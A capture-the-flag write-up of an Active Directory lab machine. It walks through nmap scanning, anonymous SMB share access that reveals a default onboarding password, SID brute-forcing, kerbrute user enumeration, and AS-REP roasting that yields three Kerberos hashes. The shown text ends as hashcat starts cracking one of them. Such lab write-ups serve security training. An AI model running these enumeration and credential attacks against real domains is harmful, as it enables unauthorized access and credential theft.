This challenge simulates a cyber-attack scenario where you must exploit an Active Directory environment.

Step into the shoes of a red teamer in our simulated hack challenge!   
Navigate a realistic organizational environment with up-to-date defenses. 

Test your penetration skills, bypass security measures, and infiltrate into the system. Will you emerge victorious as you simulate the ultimate organization APT?

Find all the flags!

MACHINE_IP: `10.10.179.81` (it changes a few times throughout the write-up, may just be marked as MACHINE_IP, thm.corp, or haystack.thm.corp)
## Enumeration

### NMAP

```bash
nmap -p- 10.10.179.81 -Pn -v
```

```bash
Host is up (0.12s latency).  
Not shown: 65514 filtered tcp ports (no-response)  
PORT      STATE  SERVICE  
53/tcp    closed domain  
88/tcp    open   kerberos-sec  
135/tcp   open   msrpc  
139/tcp   open   netbios-ssn  
389/tcp   open   ldap  
445/tcp   open   microsoft-ds  
464/tcp   open   kpasswd5  
593/tcp   open   http-rpc-epmap  
636/tcp   open   ldapssl  
3268/tcp  open   globalcatLDAP  
3269/tcp  open   globalcatLDAPssl  
3389/tcp  open   ms-wbt-server  
5985/tcp  open   wsman  
9389/tcp  open   adws  
49669/tcp open   unknown  
49670/tcp open   unknown  
49671/tcp open   unknown  
49673/tcp open   unknown  
49676/tcp open   unknown  
49702/tcp open   unknown  
53646/tcp open   unknown
```

Typical active directory ports, along with some others. 

Running a more complex scan.

```bash
nmap -p- -A 10.10.179.81 -Pn -v
```

```bash
Nmap scan report for 10.10.179.81  
Host is up (0.12s latency).  
Not shown: 65515 filtered tcp ports (no-response)  
PORT      STATE  SERVICE       VERSION  
53/tcp    closed domain  
88/tcp    open   kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-02 23:19:06Z)  
135/tcp   open   msrpc         Microsoft Windows RPC  
139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn  
389/tcp   open   ldap          Microsoft Windows Active Directory LDAP (Domain: thm.corp0., Site: Default-First-Site-Name)  
445/tcp   open   microsoft-ds?  
464/tcp   open   kpasswd5?  
593/tcp   open   ncacn_http    Microsoft Windows RPC over HTTP 1.0  
636/tcp   open   tcpwrapped  
3268/tcp  open   ldap          Microsoft Windows Active Directory LDAP (Domain: thm.corp0., Site: Default-First-Site-Name)  
3269/tcp  open   tcpwrapped  
3389/tcp  open   ms-wbt-server Microsoft Terminal Services  
|_ssl-date: 2025-07-02T23:20:35+00:00; 0s from scanner time.  
| ssl-cert: Subject: commonName=HayStack.thm.corp  
| Issuer: commonName=HayStack.thm.corp  
| Public Key type: rsa  
| Public Key bits: 2048  
| Signature Algorithm: sha256WithRSAEncryption  
| Not valid before: 2025-07-01T22:22:53  
| Not valid after:  2025-12-31T22:22:53  
| MD5:     08b3 a503 17b6 35ce 1d5c 0ae4 c42e d42b  
| SHA-1:   750e a526 bfad 34eb 21ae 2d2c b671 d357 87a7 de42  
|_SHA-256: 6366 bc7c 5909 6f84 d319 0749 eed9 bd5a 7f3e 4ff0 82c8 ceaf 6be7 75c5 a4f4 e7a2  
| rdp-ntlm-info:    
|   Target_Name: THM  
|   NetBIOS_Domain_Name: THM  
|   NetBIOS_Computer_Name: HAYSTACK  
|   DNS_Domain_Name: thm.corp  
|   DNS_Computer_Name: HayStack.thm.corp  
|   DNS_Tree_Name: thm.corp  
|   Product_Version: 10.0.17763  
|_  System_Time: 2025-07-02T23:19:57+00:00  
9389/tcp  open   mc-nmf        .NET Message Framing  
49669/tcp open   msrpc         Microsoft Windows RPC  
49670/tcp open   ncacn_http    Microsoft Windows RPC over HTTP 1.0  
49671/tcp open   msrpc         Microsoft Windows RPC  
49673/tcp open   msrpc         Microsoft Windows RPC  
49676/tcp open   msrpc         Microsoft Windows RPC  
49702/tcp open   msrpc         Microsoft Windows RPC  
53646/tcp open   msrpc         Microsoft Windows RPC  
Service Info: Host: HAYSTACK; OS: Windows; CPE: cpe:/o:microsoft:windows  
  
Host script results:  
| smb2-security-mode:    
|   3.1.1:    
|_    Message signing enabled and required  
| smb2-time:    
|   date: 2025-07-02T23:19:57  
|_  start_date: N/A  
  
NSE: Script Post-scanning.  
Initiating NSE at 18:20  
Completed NSE at 18:20, 0.00s elapsed  
Initiating NSE at 18:20  
Completed NSE at 18:20, 0.00s elapsed  
Initiating NSE at 18:20  
Completed NSE at 18:20, 0.00s elapsed  
Read data files from: /usr/bin/../share/nmap  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 531.48 seconds
```

Points of note:
```bash
|   Target_Name: THM  
|   NetBIOS_Domain_Name: THM  
|   NetBIOS_Computer_Name: HAYSTACK  
|   DNS_Domain_Name: thm.corp  
|   DNS_Computer_Name: HayStack.thm.corp  
|   DNS_Tree_Name: thm.corp  
|   Product_Version: 10.0.17763  
```

```bash
53646/tcp open   msrpc         Microsoft Windows RPC  
Service Info: Host: HAYSTACK; OS: Windows; CPE: cpe:/o:microsoft:windows
```


### SMB Enumeration

```bash
smbclient -L \\\\10.10.179.81\\
```

Entering nothing for password.

```bash
smbclient -L \\\\10.10.179.81\\  
Can't load /etc/samba/smb.conf - run testparm to debug it  
Password for [WORKGROUP\z]:  
  
       Sharename       Type      Comment  
       ---------       ----      -------  
       ADMIN$          Disk      Remote Admin  
       C$              Disk      Default share  
       Data            Disk         
       IPC$            IPC       Remote IPC  
       NETLOGON        Disk      Logon server share    
       SYSVOL          Disk      Logon server share    
SMB1 disabled -- no workgroup available
```

Informational: Anonymous SMB share login, allowing for share enumeration.

#### Data Share

```bash
smbclient //10.10.179.81/Data -N
```

```bash
smb: \> ls  
 .                                   D        0  Wed Jul 19 03:40:57 2023  
 ..                                  D        0  Wed Jul 19 03:40:57 2023  
 onboarding                          D        0  Wed Jul  2 19:40:49 2025  
  
               7863807 blocks of size 4096. 3028626 blocks available  
smb: \>
```

 Access to file share, this is a serious vulnerability.

```bash
smb: \onboarding\> ls  
 .                                   D        0  Wed Jul  2 19:42:20 2025  
 ..                                  D        0  Wed Jul  2 19:42:20 2025  
 e3dynlej.ppy.pdf                    A  4700896  Mon Jul 17 03:11:53 2023  
 jjgwb3fn.ivx.txt                    A      521  Mon Aug 21 13:21:59 2023  
 owcx4nye.kfm.pdf                    A  3032659  Mon Jul 17 03:12:09 2023  
  
               7863807 blocks of size 4096. 3028551 blocks available
```

```bash
smb: \onboarding\> mget *  
Get file unfkgw5m.lpe.pdf? y  
getting file \onboarding\unfkgw5m.lpe.pdf of size 4700896 as unfkgw5m.lpe.pdf (353.9 KiloBytes/sec) (average 353.9 KiloBytes/sec)  
Get file vbysafdu.jry.pdf? y  
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \onboarding\vbysafdu.jry.pdf  
Get file zl1wpzky.wpk.txt? y  
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \onboarding\zl1wpzky.wpk.txt  
smb: \onboarding\> dir  
 .                                   D        0  Wed Jul  2 19:43:51 2025  
 ..                                  D        0  Wed Jul  2 19:43:51 2025  
 aqcwhxqz.gco.pdf                    A  3032659  Mon Jul 17 03:12:09 2023  
 p2rqewh4.y3f.txt                    A      521  Mon Aug 21 13:21:59 2023  
 vrg3w3l4.ame.pdf                    A  4700896  Mon Jul 17 03:11:53 2023  
  
               7863807 blocks of size 4096. 3028364 blocks available  
smb: \onboarding\> ls -la  
NT_STATUS_NO_SUCH_FILE listing \onboarding\-la  
smb: \onboarding\> ls  
 .                                   D        0  Wed Jul  2 19:43:51 2025  
 ..                                  D        0  Wed Jul  2 19:43:51 2025  
 aqcwhxqz.gco.pdf                    A  3032659  Mon Jul 17 03:12:09 2023  
 p2rqewh4.y3f.txt                    A      521  Mon Aug 21 13:21:59 2023  
 vrg3w3l4.ame.pdf                    A  4700896  Mon Jul 17 03:11:53 2023  
  
               7863807 blocks of size 4096. 3028348 blocks available  
smb: \onboarding\> dir  
 .                                   D        0  Wed Jul  2 19:44:21 2025  
 ..                                  D        0  Wed Jul  2 19:44:21 2025  
 ptd3qzol.wat.pdf                    A  3032659  Mon Jul 17 03:12:09 2023  
 qkbbhwde.4am.txt                    A      521  Mon Aug 21 13:21:59 2023  
 u2aydswu.1yu.pdf                    A  4700896  Mon Jul 17 03:11:53 2023  
  
               7863807 blocks of size 4096. 3028272 blocks available  
smb: \onboarding\> ls  
 .                                   D        0  Wed Jul  2 19:44:21 2025  
 ..                                  D        0  Wed Jul  2 19:44:21 2025  
 ptd3qzol.wat.pdf                    A  3032659  Mon Jul 17 03:12:09 2023  
 qkbbhwde.4am.txt                    A      521  Mon Aug 21 13:21:59 2023  
 u2aydswu.1yu.pdf                    A  4700896  Mon Jul 17 03:11:53 2023  
  
               7863807 blocks of size 4096. 3028272 blocks available
```

The file names keep changing, which is interesting.  

`blqhamnx.x0o.txt`

```bash
cat blqhamnx.x0o.txt    
Subject: Welcome to Reset -�Dear <USER>,Welcome aboard! We are thrilled to have you join our team. As discussed during the hiring process, we are sending you the necessary login information to access your company account. Please keep this information confidential and do not share it with anyone.The initial passowrd is: [REDACTED] We are confident that you will  
contribute significantly to our continued success. We look forward to working with you and wish you the very best in your new role.Best regards,The Reset Team⏎
```

Default credential discovery.

`unfkgw5m.lpe.pdf`

```bash
exiftool unfkgw5m.lpe.pdf    
ExifTool Version Number         : 13.30  
File Name                       : unfkgw5m.lpe.pdf  
Directory                       : .  
File Size                       : 4.7 MB  
File Modification Date/Time     : 2025:07:02 19:43:28-05:00  
File Access Date/Time           : 2025:07:02 19:43:15-05:00  
File Inode Change Date/Time     : 2025:07:02 19:43:28-05:00  
File Permissions                : -rw-r--r--  
File Type                       : PDF  
File Type Extension             : pdf  
MIME Type                       : application/pdf  
PDF Version                     : 1.4  
Linearized                      : No  
Warning                         : Objects in xref table (515) exceed trailer dictionary Size (206)  
Page Count                      : 8
```

After viewing the pdf, it's a basic presentation regarding "Navigating Company Policies." No information useful to gaining initial access.

`5iyooyvz.j51.pdf`

```bash
exiftool 5iyooyvz.j51.pdf    
ExifTool Version Number         : 13.30  
File Name                       : 5iyooyvz.j51.pdf  
Directory                       : .  
File Size                       : 3.0 MB  
File Modification Date/Time     : 2025:07:02 19:51:04-05:00  
File Access Date/Time           : 2025:07:02 19:50:57-05:00  
File Inode Change Date/Time     : 2025:07:02 19:51:04-05:00  
File Permissions                : -rw-r--r--  
File Type                       : PDF  
File Type Extension             : pdf  
MIME Type                       : application/pdf  
PDF Version                     : 1.4  
Linearized                      : No  
Warning                         : Objects in xref table (497) exceed trailer dictionary Size (128)  
Page Count                      : 9
```

This pdf is another presentation regarding user onboarding. The following section is of note:

```
Subject: Welcome to Reset -
Dear LILY ONEILL,
Welcome aboard! We are thrilled to have you join our team. As discussed during the hiring process, we are sending you the necessary login
information to access your company account. Please keep this information confidential and do not share it with anyone.
The initial passowrd is: [REDACTED]
We are confident that you will contribute significantly to our continued success. We look forward to working with you and wish you the very best in
your new role.Best regards,
[The Reset Team
Subject: Welcome to Reset -
Dear LILY ONEILL,
Welcome aboard! We are thrilled to have you join our team. As discussed during the hiring process, we are sending you the necessary login
information to access your company account. Please keep this information confidential and do not share it with anyone.
The initial passowrd is: [REDACTED]
```

While similar to the text file, we now have a potential user's name, `LILY ONEILL`.

File upload test.

```bash
smb: \> put test.txt  
putting file test.txt as \test.txt (0.0 kb/s) (average 0.0 kb/s)  
smb: \> ls  
 .                                   D        0  Wed Jul  2 19:59:49 2025  
 ..                                  D        0  Wed Jul  2 19:59:49 2025  
 onboarding                          D        0  Wed Jul  2 19:59:52 2025  
 test.txt                            A        5  Wed Jul  2 19:59:49 2025  
  
               7863807 blocks of size 4096. 3028817 blocks available
```

Successfully uploaded a file.
#### NETLOGON/SYSVOL Share

NETLOGON/SYSVOL shares allow anonymous log in, but not permission to view files.

```bash
smbclient //10.10.179.81/NETLOGON -N  
  
Can't load /etc/samba/smb.conf - run testparm to debug it  
Try "help" to get a list of possible commands.  
smb: \> ls  
NT_STATUS_ACCESS_DENIED listing \*
```

File upload permission not allowed either.

```bash
smb: \> put test.txt  
NT_STATUS_ACCESS_DENIED opening remote file \test.txt
```

#### Other Shares (ADMIN, C, IPC)

Not accessible.

#### Enum4Linux

```bash
enum4linux -U 10.10.179.81  
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Jul  2 20:12:33 2025  
  
=========================================( Target Information )=========================================  
  
Target ........... 10.10.179.81  
RID Range ........ 500-550,1000-1050  
Username ......... ''  
Password ......... ''  
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none  
  
  
============================( Enumerating Workgroup/Domain on 10.10.179.81 )============================  
  
Can't load /etc/samba/smb.conf - run testparm to debug it  
  
[E] Can't find workgroup/domain  
  
  
  
===================================( Session Check on 10.10.179.81 )===================================  
  
  
[+] Server 10.10.179.81 allows sessions using username '', password ''  
  
  
================================( Getting domain SID for 10.10.179.81 )================================  
  
Can't load /etc/samba/smb.conf - run testparm to debug it  
Domain Name: THM  
Domain Sid: S-1-5-21-1966530601-3185510712-10604624  
  
[+] Host is part of a domain (not a workgroup)  
  
  
=======================================( Users on 10.10.179.81 )=======================================  
  
  
[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED  
  
  
  
[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED  
  
enum4linux complete on Wed Jul  2 20:12:49 2025
```

### RPC Client 

```bash
rpcclient -U "" -N 10.10.179.81  
  
Can't load /etc/samba/smb.conf - run testparm to debug it  
rpcclient $> enumdomusers  
result was NT_STATUS_ACCESS_DENIED  
rpcclient $> enumdomgroups  
result was NT_STATUS_ACCESS_DENIED  
rpcclient $> queryuser 0x1f4  
result was NT_STATUS_ACCESS_DENIED  
rpcclient $>
```
### User Enumeration

Since we have guest access we can attempt to enumerate users with Impacket. 

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ /usr/share/doc/python3-impacket/examples/lookupsid.py thm.corp/guest@10.10.29.46
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Brute forcing SIDs at 10.10.29.46
[*] StringBinding ncacn_np:10.10.29.46[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-1966530601-3185510712-10604624
498: THM\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: THM\Administrator (SidTypeUser)
501: THM\Guest (SidTypeUser)
502: THM\krbtgt (SidTypeUser)
512: THM\Domain Admins (SidTypeGroup)
513: THM\Domain Users (SidTypeGroup)
514: THM\Domain Guests (SidTypeGroup)
515: THM\Domain Computers (SidTypeGroup)
516: THM\Domain Controllers (SidTypeGroup)
517: THM\Cert Publishers (SidTypeAlias)
518: THM\Schema Admins (SidTypeGroup)
519: THM\Enterprise Admins (SidTypeGroup)
520: THM\Group Policy Creator Owners (SidTypeGroup)
521: THM\Read-only Domain Controllers (SidTypeGroup)
522: THM\Cloneable Domain Controllers (SidTypeGroup)
525: THM\Protected Users (SidTypeGroup)
526: THM\Key Admins (SidTypeGroup)
527: THM\Enterprise Key Admins (SidTypeGroup)
553: THM\RAS and IAS Servers (SidTypeAlias)
571: THM\Allowed RODC Password Replication Group (SidTypeAlias)
572: THM\Denied RODC Password Replication Group (SidTypeAlias)
1008: THM\HAYSTACK$ (SidTypeUser)
1109: THM\DnsAdmins (SidTypeAlias)
1110: THM\DnsUpdateProxy (SidTypeGroup)
1111: THM\3091731410SA (SidTypeUser)
1112: THM\ERNESTO_SILVA (SidTypeUser)
1113: THM\TRACY_CARVER (SidTypeUser)
1114: THM\SHAWNA_BRAY (SidTypeUser)
1115: THM\CECILE_WONG (SidTypeUser)
1116: THM\CYRUS_WHITEHEAD (SidTypeUser)
1117: THM\DEANNE_WASHINGTON (SidTypeUser)
1118: THM\ELLIOT_CHARLES (SidTypeUser)
1119: THM\MICHEL_ROBINSON (SidTypeUser)
1120: THM\MITCHELL_SHAW (SidTypeUser)
1121: THM\FANNY_ALLISON (SidTypeUser)
1122: THM\JULIANNE_HOWE (SidTypeUser)
1123: THM\ROSLYN_MATHIS (SidTypeUser)
1124: THM\DANIEL_CHRISTENSEN (SidTypeUser)
1125: THM\MARCELINO_BALLARD (SidTypeUser)
1126: THM\CRUZ_HALL (SidTypeUser)
1127: THM\HOWARD_PAGE (SidTypeUser)
1128: THM\STEWART_SANTANA (SidTypeUser)
1130: THM\LINDSAY_SCHULTZ (SidTypeUser)
1131: THM\TABATHA_BRITT (SidTypeUser)
1132: THM\RICO_PEARSON (SidTypeUser)
1133: THM\DARLA_WINTERS (SidTypeUser)
1134: THM\ANDY_BLACKWELL (SidTypeUser)
1135: THM\LILY_ONEILL (SidTypeUser)
1136: THM\CHERYL_MULLINS (SidTypeUser)
1137: THM\LETHA_MAYO (SidTypeUser)
1138: THM\HORACE_BOYLE (SidTypeUser)
1139: THM\CHRISTINA_MCCORMICK (SidTypeUser)
1141: THM\3811465497SA (SidTypeUser)
1142: THM\MORGAN_SELLERS (SidTypeUser)
1143: THM\MARION_CLAY (SidTypeUser)
1144: THM\3966486072SA (SidTypeUser)
1146: THM\TED_JACOBSON (SidTypeUser)
1147: THM\AUGUSTA_HAMILTON (SidTypeUser)
1148: THM\TREVOR_MELTON (SidTypeUser)
1149: THM\LEANN_LONG (SidTypeUser)
1150: THM\RAQUEL_BENSON (SidTypeUser)
1151: THM\AN-173-distlist1 (SidTypeGroup)
1152: THM\Gu-gerardway-distlist1 (SidTypeGroup)
1154: THM\CH-ecu-distlist1 (SidTypeGroup)
1156: THM\AUTOMATE (SidTypeUser)
```

I then used this script to parse the usernames into a wordlist:

```bash
/usr/share/doc/python3-impacket/examples/lookupsid.py thm.corp/guest@10.10.29.46 | \
grep "(SidTypeUser)" | \
awk -F'\\' '{print $2}' | \
awk '{print $1}' > usernames.txt
```

Resulting in:

```
Administrator
Guest
krbtgt
HAYSTACK$
3091731410SA
ERNESTO_SILVA
TRACY_CARVER
SHAWNA_BRAY
CECILE_WONG
CYRUS_WHITEHEAD
DEANNE_WASHINGTON
ELLIOT_CHARLES
MICHEL_ROBINSON
MITCHELL_SHAW
FANNY_ALLISON
JULIANNE_HOWE
ROSLYN_MATHIS
DANIEL_CHRISTENSEN
MARCELINO_BALLARD
CRUZ_HALL
HOWARD_PAGE
STEWART_SANTANA
LINDSAY_SCHULTZ
TABATHA_BRITT
RICO_PEARSON
DARLA_WINTERS
ANDY_BLACKWELL
LILY_ONEILL
CHERYL_MULLINS
LETHA_MAYO
HORACE_BOYLE
CHRISTINA_MCCORMICK
3811465497SA
MORGAN_SELLERS
MARION_CLAY
3966486072SA
TED_JACOBSON
AUGUSTA_HAMILTON
TREVOR_MELTON
LEANN_LONG
RAQUEL_BENSON
AUTOMATE
```

### Kerbrute 

```bash
└─$ kerbrute userenum -d thm.corp --dc thm.corp usernames.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 07/19/25 - Ronnie Flathers @ropnop

2025/07/19 18:59:51 >  Using KDC(s):
2025/07/19 18:59:51 >   thm.corp:88

2025/07/19 18:59:51 >  [+] VALID USERNAME:       HAYSTACK$@thm.corp
2025/07/19 18:59:51 >  [+] VALID USERNAME:       Guest@thm.corp
2025/07/19 18:59:51 >  [+] VALID USERNAME:       SHAWNA_BRAY@thm.corp
2025/07/19 18:59:51 >  [+] VALID USERNAME:       CYRUS_WHITEHEAD@thm.corp
2025/07/19 18:59:51 >  [+] VALID USERNAME:       Administrator@thm.corp
2025/07/19 18:59:51 >  [+] VALID USERNAME:       TRACY_CARVER@thm.corp
2025/07/19 18:59:51 >  [+] VALID USERNAME:       CECILE_WONG@thm.corp
2025/07/19 18:59:51 >  [+] VALID USERNAME:       3091731410SA@thm.corp
2025/07/19 18:59:51 >  [+] VALID USERNAME:       MICHEL_ROBINSON@thm.corp
2025/07/19 18:59:51 >  [+] VALID USERNAME:       ELLIOT_CHARLES@thm.corp
2025/07/19 18:59:51 >  [+] VALID USERNAME:       MITCHELL_SHAW@thm.corp
2025/07/19 18:59:51 >  [+] VALID USERNAME:       DEANNE_WASHINGTON@thm.corp
2025/07/19 18:59:51 >  [+] VALID USERNAME:       FANNY_ALLISON@thm.corp
2025/07/19 18:59:51 >  [+] VALID USERNAME:       MARCELINO_BALLARD@thm.corp
2025/07/19 18:59:51 >  [+] VALID USERNAME:       JULIANNE_HOWE@thm.corp
2025/07/19 18:59:51 >  [+] VALID USERNAME:       ROSLYN_MATHIS@thm.corp
2025/07/19 18:59:51 >  [+] VALID USERNAME:       DANIEL_CHRISTENSEN@thm.corp
2025/07/19 18:59:51 >  [+] VALID USERNAME:       LINDSAY_SCHULTZ@thm.corp
2025/07/19 18:59:51 >  [+] VALID USERNAME:       STEWART_SANTANA@thm.corp
2025/07/19 18:59:51 >  [+] VALID USERNAME:       CRUZ_HALL@thm.corp
2025/07/19 18:59:51 >  [+] VALID USERNAME:       HOWARD_PAGE@thm.corp
2025/07/19 18:59:51 >  [+] VALID USERNAME:       RICO_PEARSON@thm.corp
2025/07/19 18:59:51 >  [+] VALID USERNAME:       DARLA_WINTERS@thm.corp
2025/07/19 18:59:51 >  [+] VALID USERNAME:       ANDY_BLACKWELL@thm.corp
2025/07/19 18:59:51 >  [+] VALID USERNAME:       LETHA_MAYO@thm.corp
2025/07/19 18:59:51 >  [+] VALID USERNAME:       HORACE_BOYLE@thm.corp
2025/07/19 18:59:51 >  [+] VALID USERNAME:       CHERYL_MULLINS@thm.corp
2025/07/19 18:59:51 >  [+] VALID USERNAME:       CHRISTINA_MCCORMICK@thm.corp
2025/07/19 18:59:51 >  [+] VALID USERNAME:       3811465497SA@thm.corp
2025/07/19 18:59:51 >  [+] VALID USERNAME:       MARION_CLAY@thm.corp
2025/07/19 18:59:51 >  [+] VALID USERNAME:       3966486072SA@thm.corp
2025/07/19 18:59:51 >  [+] VALID USERNAME:       MORGAN_SELLERS@thm.corp
2025/07/19 18:59:51 >  [+] VALID USERNAME:       TED_JACOBSON@thm.corp
2025/07/19 18:59:51 >  [+] VALID USERNAME:       AUGUSTA_HAMILTON@thm.corp
2025/07/19 18:59:51 >  [+] VALID USERNAME:       TREVOR_MELTON@thm.corp
2025/07/19 18:59:51 >  [+] VALID USERNAME:       TABATHA_BRITT@thm.corp
2025/07/19 18:59:51 >  [+] VALID USERNAME:       AUTOMATE@thm.corp
2025/07/19 18:59:51 >  [+] VALID USERNAME:       RAQUEL_BENSON@thm.corp
2025/07/19 18:59:51 >  [+] VALID USERNAME:       LEANN_LONG@thm.corp
2025/07/19 18:59:51 >  [+] VALID USERNAME:       ERNESTO_SILVA@thm.corp
2025/07/19 18:59:51 >  Done! Tested 42 usernames (40 valid) in 0.944 seconds
```

### AS-REP Roasting

```bash
└─$ GetNPUsers.py thm.corp/ -dc-ip 10.10.190.63 -usersfile usernames.txt -format hashcat 
/home/kali/.local/share/pipx/venvs/impacket/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

/home/kali/.local/bin/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User HAYSTACK$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User 3091731410SA doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$ERNESTO_SILVA@THM.CORP:9e65c07dc54965ea91fc5bf07eb9633e$c2ad2abe6b1b81d3f19bcd86015914da8e69f50b2767cac6b6822bcecc236f68c78fdf129c0e62432a539f83319dd7a50b897481dafbfac0ca911319a933c53adbfc0e2335c3f3bbd8235d3d870eec084823a5611b1c1a0c4048311ec1500d3872e62ada58eb4a7af37760c8ac1fee5598027adb8dcdee893f30762ed0d5a24d644c5621fbffe09377191e5544434b1978ca6ec3994c65d3f1e3a743e203c0d19a96a57181e1f19a66ba1151dd3fb1947545d9bff8e9394b6cae8574b9b98e7fd3b97539a308ac40e0967fe86ea7fabe3ba5b841caa29572c5ae4c35609d1baa7b987ee3
[-] User TRACY_CARVER doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User SHAWNA_BRAY doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User CECILE_WONG doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User CYRUS_WHITEHEAD doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User DEANNE_WASHINGTON doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ELLIOT_CHARLES doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User MICHEL_ROBINSON doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User MITCHELL_SHAW doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User FANNY_ALLISON doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User JULIANNE_HOWE doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ROSLYN_MATHIS doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User DANIEL_CHRISTENSEN doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User MARCELINO_BALLARD doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User CRUZ_HALL doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HOWARD_PAGE doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User STEWART_SANTANA doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User LINDSAY_SCHULTZ doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$TABATHA_BRITT@THM.CORP:cba9fb91cc8b10eb748c179445941c85$94723b2c841d885f6f3743344f76de5406438e06bd8fbec8b143c0ee2170c5b5efce9a4ea6654db40b06439244db2216ef5a243afc828a2553053d9a194ba8c32ca58eb0b9705d0f0c114231c9314552a7c173136c1f797563e44a5bdc8c4d99938306d203ce67090e328221563003e72411a00ffc66a74474edf17196ec0ea38a85bbb221747774ef1080388ba3280db0d677edd93ac0e9c75a00a40ab8a47c96bfa6ddf19a7c7fdedfe8092d92622c26603de0794fd00c89035a38a7ca7488adc8c7df0697aa57badae65954439a598ff1455e6a9797532341c01b8f634ecc4749a956
[-] User RICO_PEARSON doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User DARLA_WINTERS doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ANDY_BLACKWELL doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User CHERYL_MULLINS doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User LETHA_MAYO doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HORACE_BOYLE doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User CHRISTINA_MCCORMICK doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User 3811465497SA doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User MORGAN_SELLERS doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User MARION_CLAY doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User 3966486072SA doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User TED_JACOBSON doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User AUGUSTA_HAMILTON doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User TREVOR_MELTON doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$LEANN_LONG@THM.CORP:f8bee92826a812c2a8315ce3e4308267$9c202b4626cc9ae9f16117582e670b1e57ed7f7371a82f1285f5c0147a85053071f09e4e22e31c0838b8bb7494efe5b3bb534890070ceacbcf8a09702bb54328d3e352ca00a79b02e76b520e6f106ed90e941bd30300072cdee9f8faba9e930d700d9fed33ba23270d0a6da12c676271f2e4b51e71752a6041166e14d1a7c3d9636700c03eac35d7ef0aa98a375b3cec729388882049842b0c3763a6f09233022472a7fda42ebb69712a1398c9fae318f0a0255fa02482891a7f97d2c89e8c104ad20128a99b4b924136369bb826f19f74bb138b28fa6e3fccf5442612ee4fc9b90bd38f
[-] User RAQUEL_BENSON doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User AUTOMATE doesn't have UF_DONT_REQUIRE_PREAUTH set
```

We're able to obtain a few hashes.

```bash
└─$ hashcat -O -a 0 -m 18200 tabatha_hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #1: cpu-haswell-12th Gen Intel(R) Core(TM) i5-12600K, 2917/5899 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 31

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Optimized-Kernel
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

